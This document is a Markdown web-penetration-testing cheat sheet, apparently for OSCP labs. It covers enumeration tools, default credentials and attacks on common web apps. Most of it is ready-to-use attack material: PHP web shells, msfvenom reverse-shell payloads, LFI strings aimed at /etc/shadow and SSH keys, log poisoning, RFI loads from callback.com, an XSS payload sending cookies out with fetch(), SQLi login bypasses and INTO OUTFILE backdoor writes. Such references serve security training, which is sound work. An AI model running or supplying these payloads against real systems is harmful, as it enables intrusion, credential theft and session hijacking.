# Web Enum Quick Reference  
## Contents 
- [Web Enum Quick Reference](#web-enum-quick-reference)
  * [Contents](#contents)
  * [HTTP and HTTPS Checklist](#http-and-https-checklist)
  * [Scan for sub directories and pages](#scan-for-sub-directories-and-pages)
    + [Wordlists](#wordlists)
    + [Scanning Tools](#scanning-tools)
    + [Curl](#curl)
- [Web app specific](#web-app-specific)
    + [Default Creds](#default-creds)
    + [Adobe Coldfusion](#adobe-coldfusion)
    + [Elastix](#elastix)
    + [Drupal](#drupal)
    + [JBoss](#jboss)
    + [Jenkins](#jenkins)
    + [Joomla](#joomla)
    + [PHPMyAdmin](#phpmyadmin)
    + [Tomcat](#tomcat)
    + [Wordpress](#wordpress)
- [Login pages](#login-pages)
- [File Inclusion](#file-inclusion)
  * [Local File Inclusion](#local-file-inclusion)
    + [File Upload Pages](#file-upload-pages)
    + [LFI Testing](#lfi-testing)
    + [Interesting Files](#interesting-files)
  * [Remote File Inclusion](#remote-file-inclusion)
  * [Web Payloads](#web-payloads)
    + [Testing](#testing)
- [Command Injection](#command-injection)
  * [XSS](#xss)
  * [SQL Injection](#sql-injection)
    + [SQLMAP (Not allowed on OSCP exam but good for labs!)](#sqlmap--not-allowed-on-oscp-exam-but-good-for-labs--)
    + [Manual Testing](#manual-testing)
- [Resources](#resources)
  * [Cheat Sheets](#cheat-sheets)
  * [Further Reading](#further-reading)
  * [Sources](#sources)

## HTTP and HTTPS Checklist   
- [ ] Look for service name and version - searchsploit / google for exploits   
- [ ] Service specific scanners: wpscan, sqlmap     
- [ ] Check for a robots.txt page    
- [ ] Scan page with Wappanalyzer  
- [ ] Scan for sub directories and pages - admin pages?, login pages?, file upload?, user input fields?    
- [ ] Admin page - access misconfigs, login?       
- [ ] Log in pages - guess default creds, admin:admin, admin:password   
- [ ] File upload pages - what types of files are accepted?, what checks are being implemented?  
- [ ] User input fields: SQL injection, cross site scripting   
- [ ] Intercept HTTP requests with Burp and examine    	

Reference: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)    
[Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions  
## Scan for sub directories and pages	
### Wordlists 
Common wordlists to use for web directory scanning: 

    /usr/share/wordlists/dirb/common.txt
    /usr/share/wordlists/dirbuster/*.txt
    /usr/share/wordlists/wfuzz/general/*.txt
    /usr/share/seclists/Discovery/Web-Content/

Common wordlists to use for user enumeration scanning: 

    /usr/share/seclists/Usernames
    /usr/share/wordlists/dirbuster/apache-user-enum-2.0
    
### Scanning Tools

    nikto -h http://127.0.0.1:80/     
    dirb http://127.0.0.1/   (default word list: common.txt)     
    gobuster dir -u http://127.0.0.1/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z     
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -c -v  
    feroxbuster -u http://target.com -w /usr/share/dirb/wordlists/common.txt -d [recurson depth] -t [threads] -s [status codes] 

    whatweb http://target  
    wfuzz -c --hc=404 -R 2 -w /usr/share/dirb/wordlists/common.txt http://target/fuzz   
    
### Curl 

    curl -v -X OPTIONS http://<targetip>/test/  
    curl --upload-file <file name> -v --url <url> -0 --http1.0
    
Other Tools: 
    Burp Suite 
    OWASP Zap 
    Cadaver 
    SQLMap 
    Joomscan 
    Feroxbuster	 
    
	
# Web app specific  
### Default Creds 

    https://cirt.net/passwords
    https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
    
### Adobe Coldfusion 
https://nets.ec/Coldfusion_hacking   
https://www.drchaos.com/post/a-walk-down-adversary-lane-coldfusion-v8

    Metasploit - Determine version
    /CFIDE/adminapi/base.cfc?wsdl
    Version 8 Vulnerabilities
    Fckeditor: use exploit/windows/http/coldfusion_fckeditor

LFI 

    http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

### Elastix 

    default login are admin:admin at /vtigercrm/
    able to upload shell in profile-photo
    Examine configuration files - Generic
    Examine httpd.conf/ windows config files 
    
### Drupal
[droopsescan](https://github.com/droope/droopescan) 

    /CHANGELOG.txt to find version

### JBoss

    JMX Console http://IP:8080/jmxconcole/
    WAR File payload   

### Jenkins
[pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)   

### Joomla 

    admin page: /administrator
    other pages: configuration.php, diagnostics.php, joomla.inc.php, config.inc.php   
    
### PHPMyAdmin

    Default password root:root, pma:
    Brute force with Burp or phpmyadmin python script

### Tomcat 

    Usually port 8080, /manager
    default creds tomcat:s3cret
    generate WAR reverse shell payload, upload and deploy 
    
### Wordpress  

    admin pages:  /wp-admin    /wp-login
    config files:  /setup-config.php   /wp-config.php
		
wpscan 

    wpscan --url <domain>
    wpscan --url <domain> --enumerate ap at (All Plugins, All Themes)
    wpscan --url <domain> --enumerate u (Usernames)       #or zoom.py 
    wpscan --url <domain> --enumerate v 
    
    wpscan -u 192.168.0.15 --enumerate -t --enumerate u --enumerate p
    Bruteforce login page       wpscan –u ipaddress --username name --wordlist wordlist

# Login pages   
	
	Default creds - admin: admin, admin:password, service specific default creds   
	Register a new user  
	Brute force log in  
	SQL injection  


# File Inclusion    
[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
[PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  

## Local File Inclusion 
### File Upload Pages

Bypass extension filtering: rename shell 
Bypass header check: 

    %PDF-1.4
    <?php system($_GET["cmd"]); ?>

### LFI Testing 
Check for client side scripts 

    http://example.com/index.php?page=../../../etc/passwd  
    http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 bypass
    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00        # double encoding    
    http://example.com/index.php?page=....//....//etc/passwd
    http://example.com/index.php?page=..///////..////..//////etc/passwd
    http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
	
    /etc/passwd, etc.
    can you include a remote file?
    ?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
	
    http://example.labs/page.php?file=php://filter/resource=/etc/passwd             #php filter wrapper 
	
	
Vulnerable PHP functions

    include
    require
    include_once 
    require_once 
	
### Interesting Files 
Linux 

    /etc/passwd
    /etc/shadow
    /etc/issue
    /etc/group
    /etc/hostname
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /root/.ssh/id_rsa
    /root/.ssh/authorized_keys
    /home/user/.ssh/authorized_keys
    /home/user/.ssh/id_rsa

Windows 

    /boot.ini
    /autoexec.bat
    /windows/system32/drivers/etc/hosts
    /windows/repair/SAM

Log Poisoning 

	open: /log/apache2/access.log 
	send payload as user agent string: <?php system($_GET['cmd']); ?>    
	/log/apache2/access.log&cmd=id  
	
## Remote File Inclusion 
Turning LFI to RFI: https://l.avala.mp/?p=241
[Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)  

## Web Payloads 

PHP

    <?php echo shell_exec($_GET['cmd']);?> 
    <?php system($_GET['cmd']);?>
    <?php passthru($_GET['cmd']);?>
      
      
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

### Testing 

    http://example.com/index.php?page=http://callback.com/shell.txt
    http://example.com/index.php?page=http://callback.com/shell.txt%00
    http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt
	
# Command Injection 
[Payloads](https://github.com/payloadbox) 

## XSS
Basic Payload

     <script>alert("XSS")</script>
     
Steal Session Cookie

    <script>fetch('https://site.com/page?cookie=' + btoa(document.cookie));</script>

## SQL Injection 
[SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
[Pentestmonkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
Enum using nmap

    nmap -sV --script=http-sql-injection <target>  
    
Using jsql 

### SQLMAP (Not allowed on OSCP exam but good for labs!) 
Crawl a page to find sql-injections

    sqlmap -u http://example.com --crawl=1
Custom SQLi
    sqlmap -u --data="query" -D [database name] --tables --threads 5 
    
Dump database 

    sqlmap -u http://172.21.0.0 --dbms=mysql --dump
Get a shell 

    sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell
Using sqlmap with login-page  
Capture the request using burp suite, and save the request in a file.

    sqlmap -r request.txt


### Manual Testing 
For a row 

    http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
    
Login bypass

    'or 1=1- -
    ' or '1'=1
    ' or '1'=1 - -
    '–
    ' or '1'='1
    -'
    ' '
    '&'
    '^'
    '*'
    ' or ''-'
    ' or '' '
    ' or ''&'
    `' or ''^'``
    `' or ''*'
    "-"
    " "
    "&"
    "^"
    "*"
    " or ""-"
    " or "" "
    " or ""&"
    " or ""^"
    " or ""*"
    or true--
    " or true--
    ' or true--
    ") or true--
    ') or true--
    ' or 'x'='x
    ') or ('x')=('x
    ')) or (('x'))=(('x
    " or "x"="x
    ") or ("x")=("x
    ")) or (("x"))=(("x
    
Known Username

    admin’ - -
    admin’) - -
    
Using error-bases DB enumeration

    Add the tick '
    Enumerate columns  
    
Using order by
https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html

	 
 SQL Injection Webshells
 
     #Linux
     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
     
     #Windows
     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
	
	
Example SQLi on Windows:
#testing

    http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

#exploitation

    http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

	
# Resources  

## Cheat Sheets 
[SQLi cheat sheet](https://guif.re/sqli)  
[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/Glossary.html)    

## Further Reading 
[OWASP Web App Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)    
[Bypassing File Upload Restrictions ](http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html)      
[Web vulnerabilities to gain access to the system - paper](https://www.exploit-db.com/papers/13017/)     

File Inclusion
[RFI to LFI](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) 

Basic SQLi 
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html  

http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html  

http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html  

http://www.sqlinjection.net/login/

## Sources 
https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/web 
